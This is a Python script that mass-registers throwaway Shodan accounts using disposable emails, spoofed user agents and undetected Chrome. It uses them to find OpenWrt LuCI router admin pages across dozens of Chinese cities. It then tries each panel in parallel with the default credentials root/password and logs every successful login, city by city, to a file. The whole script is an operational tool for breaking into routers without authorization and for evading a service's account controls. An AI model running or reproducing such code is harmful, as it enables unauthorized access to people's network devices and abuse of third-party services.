import requests
import base64
import json
from lxml import etree
import urllib3
import time
import threading
import os
import re
import threading
from fake_useragent import UserAgent
# 忽略警告加这2行
from urllib3 import disable_warnings
disable_warnings()

import undetected_chromedriver as uc
from selenium import webdriver


register_url = 'https://account.shodan.io/register'
login_url = 'https://account.shodan.io/login'
s_url = 'https://www.shodan.io/search?query='

register_data = {
	'username': '*',
	'password': '*',
	'password_confirm': '*',
	'email': '*',
	'csrf_token': '*'
}

login_data = {
	'username': '*',
	'password': '*',
	'grant_type': 'password',
	'continue': 'http://www.shodan.io/dashboard',
	'csrf_token': '*'
}

login_data = {
	'luci_username': 'root',
	'luci_password': 'password',
}


headers = {
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'User-Agent': '*',
}

proxies = {'http': "socks5://127.0.0.1:7890",
           'https': "socks5://127.0.0.1:7890"}

def get_new_email(driver):
	change_url = 'https://www.linshiyouxiang.net/api/v1/mailbox/keepalive?force_change=1&_ts={}'
	driver.get(change_url.format(int(time.time())))
	time.sleep(3.5)
	res = driver.page_source 
	mailbox = re.search(r'"mailbox":"(.*?)"', res).group(1)
	return mailbox

def register(register_url, headers, register_data, mailbox):
	ses = requests.Session()
	res = ses.get(url=register_url, proxies=proxies)
	csrf_token = re.search(r'csrf.*?value="(.*?)" />', res.text).group(1)

	mailbox = mailbox+'@idrrate.com' 
	headers['User-Agent'] = UserAgent().random
	register_data['username'] = mailbox
	register_data['password'] = mailbox
	register_data['password_confirm'] = mailbox
	register_data['email'] = mailbox
	register_data['csrf_token'] = csrf_token
	res = ses.post(url=register_url, proxies=proxies, headers=headers, data=register_data)
	return res.text, ses

def get_message(mailbox, driver):
	mail_url = 'https://www.linshiyouxiang.net/api/v1/mailbox/{}@idrrate.com'
	message_url = 'https://www.linshiyouxiang.net/mailbox/{}/{}'
	time.sleep(1)
	driver.get(mail_url.format(mailbox))
	res = driver.page_source
	print(len(res))
	if len(res) < 250:
		return False
	# print(res)
	mes_id = re.search(r'"id":"(.*?)"', res).group(1)
	driver.get(message_url.format(mailbox, mes_id))
	res = driver.page_source
	# res = requests.get('https://www.linshiyouxiang.net/mailbox/t3xof7_q/633e5a5e9db94400072c1b2a')
	verify_url = re.search(r'<a href="(.*?)" style="color: #0955C0', res).group(1)
	driver.get(verify_url)
	return True

def login(login_url, headers, login_data, mailbox, ses):
	res = ses.get(url=login_url, proxies=proxies)
	csrf_token = re.search(r'csrf.*?value="(.*?)" />', res.text).group(1)
	mailbox = mailbox+'@idrrate.com' 
	headers['User-Agent'] = UserAgent().random
	login_data['username'] = mailbox
	login_data['password'] = mailbox
	login_data['csrf_token'] = csrf_token
	res = ses.post(url=login_url, headers=headers, proxies=proxies, data=login_data)
	return ses

def keep_cookie(driver):
	flag = False
	while flag == False:
		mailbox = get_new_email(driver)
		res, ses = register(register_url, headers, register_data, mailbox)
		flag = get_message(mailbox, driver)
	ses = login(login_url, headers, login_data, mailbox, ses)
	return ses


def search(ses, s_query):
	headers['User-Agent'] = UserAgent().random
	res = ses.get(url=s_url+s_query, proxies=proxies, headers=headers)
	html = etree.HTML(res.text)

	sel = html.xpath('//div[@class="result"]//a[@class="text-danger"]/@href')
	return sel

def process_luci(luci, serach_time, city):
	login_url = luci + '/cgi-bin/luci'
	try:
		login_res = requests.post(url=login_url, data=login_data, proxies=proxies, verify=False)
		if login_res.status_code == 200:
			print('*'*50)
			print(login_res.status_code)
			print(login_url)
			print('*'*50)
			with open('{}.txt'.format(serach_time), 'a+') as f:
				f.write(login_url + '\t' + city + '\n')
		elif login_res.status_code == 403:
			print("ERROR: Password is Wrong!\t" + str(login_url))
		else:
			print("无法打开页面!\t" + str(login_url))
	except Exception as e:
		print("太久了网页失踪了: " + str(login_url))		

if __name__ == '__main__':

	serach_time = time.strftime("%Y-%m-%d")
	# serach_time = '2'
	driver = uc.Chrome()
	# query_city = ['hangzhou']
	query_city = ['zhengzhou', 'ningbo', 'hefei', 'wuxi', 'xiamen', 'fuzhou', 'jinan', 'dalian', 'kunming', 'changchun', 'foshan', 'dongguan', 'quanzhou', 'wenzhou', 'guiyang', 'nanning', 'nanchang', 'changzhou', 'nantong', 'zhuhai','yantai', 'shaoxing', 'jiaxing', 'huizhou', 'taiyuan',  'tangshan', 'jinhua', 'weifang','taizhou', 'zhongshan', 'yangzhou', 'lanzhou', 'xuzhou', 'zhenjiang', 'huzhou', ]
# 'ganzhou', 'beijing', 'shanghai', 'guangzhou', 'shenzhen', 'hangzhou', 'chengdu', 'suzhou', 'nanjing', 'chongqing', 'wuhan', 'tianjin', 'qingdao', 
	num = 0
	for city in query_city:
		if num % 5 == 0:
			ses = keep_cookie(driver)
		num += 1
		for page in range(1, 3):
			print('#'*50)
			print('当前城市:{}\t当前页数:{}'.format(city, page))
			print('#'*50)
			s_query = 'title%3A%22LUCI%22+country%3A%22CN%22+city%3A%22{}%22&page={}'.format(city, page)
			luci_list = search(ses, s_query)
			if len(luci_list) == 0:
				print('%'*50 + city + str(page))

			thread_list = []
			for luci in luci_list:
				thr = threading.Thread(target=process_luci, args=(luci, serach_time, city))
				thread_list.append(thr)

			for thr in thread_list[:-1]:
				thr.start()
			for thr in thread_list[-1:]:
				thr.start()
				thr.join()
	driver.close()
